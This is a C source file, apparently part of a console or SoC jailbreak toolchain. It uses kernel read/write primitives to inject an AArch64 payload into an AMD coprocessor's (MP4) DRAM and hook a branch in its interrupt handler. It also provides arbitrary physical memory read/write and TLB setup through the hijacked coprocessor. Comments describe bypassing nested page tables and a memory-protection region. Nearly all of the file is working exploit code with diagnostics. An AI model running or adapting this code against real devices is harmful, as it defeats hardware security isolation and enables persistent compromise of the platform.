/*
 * Inject the AArch64 payload into MP4 DRAM.
 *
 * Steps:
 *   1. Write thunk code to 0x600E0000 (within branch range of hook site)
 *   2. Write main payload to 0x607F1000
 *   3. Patch BL is_qaf at 0x108BD4 to branch to thunk
 *   4. Enable QAF flag (dword_123B74)
 *
 * The hook at 0x108BD4 is in the IRQ handler (GIC IDs 83/78), called
 * after all c2p registers have been read into W19-W24. The thunk
 * shuffles these into the _start(core, cmd, arg1, arg2, arg3) ABI.
 *
 * Prerequisite: TMR 20 must be disabled (call tmr_bypass_init first).
 */
int mp4_inject_payload(struct phys_rw_ctx *ctx)
{
    uint64_t dram_base_kva = ctx->dmap_base + MP4_DRAM_BASE;
    uint64_t bar2_kva = ctx->dmap_base + MP4_BAR2_PA;
    uint32_t branch_insn;
    uint32_t qaf_flag;
    int32_t bl_offset;
    uint32_t probe;
    int32_t rc;

    /*
     * Probe BAR2 MMIO for a DRAM window.
     * On some AMD SoC coprocessors, the BAR includes a memory aperture
     * that gives x86 access to the coprocessor's DRAM through MMIO
     * (bypassing nested page tables). Check several offsets for the
     * A53 ELF magic (0x464C457F).
     */
    printf("[*] Probing BAR2 (PA 0x%llx) for DRAM window...\n",
           (unsigned long long)MP4_BAR2_PA);
    {
        uint32_t offsets[] = { 0x0, 0x10000, 0x100000, 0x200000 };
        for (int i = 0; i < 4; i++) {
            probe = 0;
            kernel_copyout(bar2_kva + offsets[i], &probe, 4);
            printf("[DIAG] BAR2+0x%06x = 0x%08x%s\n", offsets[i], probe,
                   probe == 0x464C457F ? " (ELF magic!)" : "");
        }
    }

    /*
     * Probe DRAM via DMAP at an address we KNOW is mapped (PD[0x103]
     * covers PA 0x60600000-0x607FFFFF and already exists in page tables).
     * This tests whether DMAP access works for DRAM PAs that the kernel
     * already has page table entries for.
     */
    printf("[*] Probing DRAM via existing DMAP entries...\n");
    probe = 0xDEAD0001;
    rc = kernel_copyout(ctx->dmap_base + 0x60600000ULL, &probe, 4);
    printf("[DIAG] DMAP+0x60600000 (PD[0x103]): 0x%08x (rc=%d)\n", probe, rc);

    probe = 0xDEAD0002;
    rc = kernel_copyout(ctx->dmap_base + 0x60700000ULL, &probe, 4);
    printf("[DIAG] DMAP+0x60700000 (PD[0x103]): 0x%08x (rc=%d)\n", probe, rc);

    /*
     * Now probe our new PDE at PD[0x100] (PA 0x60000000-0x601FFFFF).
     * This is the critical test: if nested page tables block this PA,
     * the kernel will panic here. The printf above acts as a checkpoint.
     */
    printf("[*] Probing DRAM via new PD[0x100] (PA 0x60000000)...\n");
    printf("[*] >>> If no output follows, nPT blocked the access <<<\n");
    probe = 0xDEAD0003;
    rc = kernel_copyout(dram_base_kva + 0x100000, &probe, 4);
    printf("[DIAG] DRAM[0x100000] = 0x%08x (rc=%d) %s\n", probe, rc,
           probe == 0x464C457F ? "(ELF magic!)" : "");

    if (rc != 0 || probe == 0xDEAD0003) {
        printf("[!] DRAM access via DMAP failed (rc=%d)\n", rc);
        printf("[!] Need alternative DRAM write mechanism\n");
        return -1;
    }

    printf("[+] DRAM access working! Proceeding with injection...\n");

    /* Diagnostic: Read DRAM[0x0] */
    probe = 0;
    kernel_copyout(dram_base_kva, &probe, sizeof(probe));
    printf("[DIAG] DRAM[0x0] = 0x%08x %s\n", probe,
           probe == 0x464C457F ? "(ELF magic!)" : "");

    /* Step 1: Write thunk at 0x600E0000 */
    kernel_copyin(mp4_thunk_bin, dram_base_kva + MP4_THUNK_OFFSET,
                  mp4_thunk_bin_len);

    /* Step 2: Write main payload at 0x607F1000 */
    kernel_copyin(mp4_payload_bin, dram_base_kva + MP4_PAYLOAD_OFFSET,
                  mp4_payload_bin_len);

    /* Step 3: Patch BL is_qaf -> BL thunk
     *
     * Hook site: BL is_qaf at A53 VA 0x108BD4 (IRQ handler)
     * Thunk at DRAM + 0xE0000 = A53 VA 0x100000 + 0xE0000 = 0x1E0000
     *
     * BL encoding: 0x94000000 | (offset_in_words & 0x3FFFFFF)
     * offset = (thunk_addr - hook_addr) / 4
     */
    bl_offset = ((int32_t)(A53_ELF_BASE + MP4_THUNK_OFFSET) -
                 (int32_t)A53_HOOK_ADDR) / 4;
    branch_insn = 0x94000000 | (bl_offset & 0x03FFFFFF);
    printf("[*] BL insn: 0x%08x (offset %d words, thunk VA 0x%x -> hook VA 0x%x)\n",
           branch_insn, bl_offset,
           A53_ELF_BASE + MP4_THUNK_OFFSET, A53_HOOK_ADDR);

    kernel_copyin(&branch_insn,
                  dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE),
                  sizeof(branch_insn));

    /* Step 4: Enable QAF flag */
    qaf_flag = 1;
    kernel_copyin(&qaf_flag, dram_base_kva + A53_QAF_FLAGS_OFF,
                  sizeof(qaf_flag));

    /* Verify writes landed */
    kernel_copyout(dram_base_kva + (A53_HOOK_ADDR - A53_ELF_BASE), &probe,
                   sizeof(probe));
    printf("[DIAG] After write: DRAM[0x%x] = 0x%08x (expect 0x%08x)\n",
           (uint32_t)(A53_HOOK_ADDR - A53_ELF_BASE), probe, branch_insn);

    kernel_copyout(dram_base_kva + A53_QAF_FLAGS_OFF, &probe, sizeof(probe));
    printf("[DIAG] After write: DRAM[0x%x] = 0x%08x (expect 0x00000001)\n",
           (uint32_t)A53_QAF_FLAGS_OFF, probe);

    return 0;
}

/*
 * Send a command to the MP4 payload via DECI5S doorbell.
 *
 * Writing to c2p registers via DMAP doesn't trigger the A53's GIC
 * interrupt. We must use the DECI5S ioctl/doorbell mechanism to
 * generate the interrupt that fires the IRQ handler where our
 * payload hook lives.
 *
 * This delegates to deci5s_send_cmd() which:
 *   1. Opens /dev/mp4/dump and sets coredump state
 *   2. Writes args to c2p regs 1-3
 *   3. Writes command to c2p reg 0 (triggers interrupt)
 *   4. Polls c2p reg 0 until 0 (acknowledged) or timeout
 */
int mp4_send_command(struct phys_rw_ctx *ctx, uint32_t cmd,
                     uint32_t arg1, uint32_t arg2, uint32_t arg3, uint32_t ack)
{
    (void)ctx; /* No longer needed — deci5s_send_cmd uses its own bar2 */
    return deci5s_send_cmd(cmd, arg1, arg2, arg3, ack);
}

/* Read 32-bit value via MP4 */
uint32_t mp4_read32(struct phys_rw_ctx *ctx, uint64_t addr)
{
    uint32_t lo = (uint32_t)addr;
    uint32_t hi = (uint32_t)(addr >> 32);

    if (mp4_send_command(ctx, MP4_CMD_MEM_READ, lo, hi, MP4_MEM_SIZE_32, 0) != 0)
        return 0;

    return deci5s_get_result(1);
}

/* Read 64-bit value via MP4 */
uint64_t mp4_read64(struct phys_rw_ctx *ctx, uint64_t addr)
{
    uint32_t lo = (uint32_t)addr;
    uint32_t hi = (uint32_t)(addr >> 32);

    if (mp4_send_command(ctx, MP4_CMD_MEM_READ, lo, hi, MP4_MEM_SIZE_64, 0) != 0)
        return 0;

    uint32_t val_lo = deci5s_get_result(1);
    uint32_t val_hi = deci5s_get_result(2);
    return ((uint64_t)val_hi << 32) | val_lo;
}

/* Write 32-bit value via MP4 */
void mp4_write32(struct phys_rw_ctx *ctx, uint64_t addr, uint32_t val)
{
    uint32_t lo = (uint32_t)addr;
    uint32_t hi = (uint32_t)(addr >> 32);

    mp4_send_command(ctx, MP4_CMD_MEM_W32, lo, hi, val, 0);
}

/* Write 64-bit value via MP4 */
void mp4_write64(struct phys_rw_ctx *ctx, uint64_t addr, uint64_t val)
{
    uint32_t addr_lo = (uint32_t)addr;
    uint32_t addr_hi = (uint32_t)(addr >> 32);
    uint32_t val_lo = (uint32_t)val;
    uint32_t val_hi = (uint32_t)(val >> 32);

    mp4_send_command(ctx, MP4_CMD_MEM_W64, addr_lo, addr_hi, val_lo, val_hi);
}

/* Setup SysHub TLB entry via MP4 */
int mp4_syshub_tlb_setup(struct phys_rw_ctx *ctx, uint32_t tlb, uint64_t addr)
{
    uint32_t addr_lo = (uint32_t)addr;
    uint32_t addr_hi = (uint32_t)(addr >> 32);

    return mp4_send_command(ctx, MP4_CMD_TLB_SETUP, addr_lo, addr_hi, tlb, 0);
}

/* Ping the MP4 payload (verify it's alive) */
int mp4_ping(struct phys_rw_ctx *ctx)
{
    if (mp4_send_command(ctx, MP4_CMD_PING, 0, 0, 0, 0) != 0)
        return -1;

    uint32_t val = deci5s_get_result(1);
    return (val != 0) ? 0 : -1;
}
